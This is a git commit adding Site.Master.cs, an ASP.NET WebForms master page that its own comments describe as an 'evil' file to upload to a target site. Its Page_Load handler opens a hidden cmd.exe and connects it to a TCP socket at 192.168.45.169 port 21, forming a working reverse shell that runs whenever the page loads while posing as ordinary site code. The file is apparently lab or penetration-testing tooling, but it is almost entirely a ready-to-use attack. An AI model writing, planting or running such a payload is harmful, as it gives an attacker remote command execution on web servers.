941d4101526bc9c61850453b7dc32312add4be36
Miranda <120993025+Miranda-Bai@users.noreply.github.com>
2023-12-30 13:36:16 +1300

    Create Site.Master.cs

---
+++ Site.Master.cs
@@ -0,0 +1,75 @@
+// Site.Master.cs file example:
+// https://github.com/autofac/Examples/blob/master/src/WebFormsExample/Site.Master.cs
+// usage: evil Site.Master.cs file
+// can be used to upload the the website which is using .NET WebForm
+
+using System;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System;
+using System.Web.UI;
+
+namespace MyNamespaceMaster
+{
+	public partial class MyClassMaster:MasterPage
+	{
+		static StreamWriter streamWriter;
+
+		protected void Page_Load(object sender, EventArgs e)
+		{
+			using(TcpClient client = new TcpClient("192.168.45.169", 21))
+			{
+				using(Stream stream = client.GetStream())
+				{
+					using(StreamReader rdr = new StreamReader(stream))
+					{
+						streamWriter = new StreamWriter(stream);
+						
+						StringBuilder strInput = new StringBuilder();
+
+						Process p = new Process();
+						p.StartInfo.FileName = "cmd.exe";
+						p.StartInfo.CreateNoWindow = true;
+						p.StartInfo.UseShellExecute = false;
+						p.StartInfo.RedirectStandardOutput = true;
+						p.StartInfo.RedirectStandardInput = true;
+						p.StartInfo.RedirectStandardError = true;
+						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+						p.Start();
+						p.BeginOutputReadLine();
+
+						while(true)
+						{
+							strInput.Append(rdr.ReadLine());
+							//strInput.Append("\n");
+							p.StandardInput.WriteLine(strInput);
+							strInput.Remove(0, strInput.Length);
+						}
+					}
+				}
+			}
+		}
+
+		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder strOutput = new StringBuilder();
+
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    streamWriter.WriteLine(strOutput);
+                    streamWriter.Flush();
+                }
+                catch (Exception err) { }
+            }
+        }
+
+	}
+}
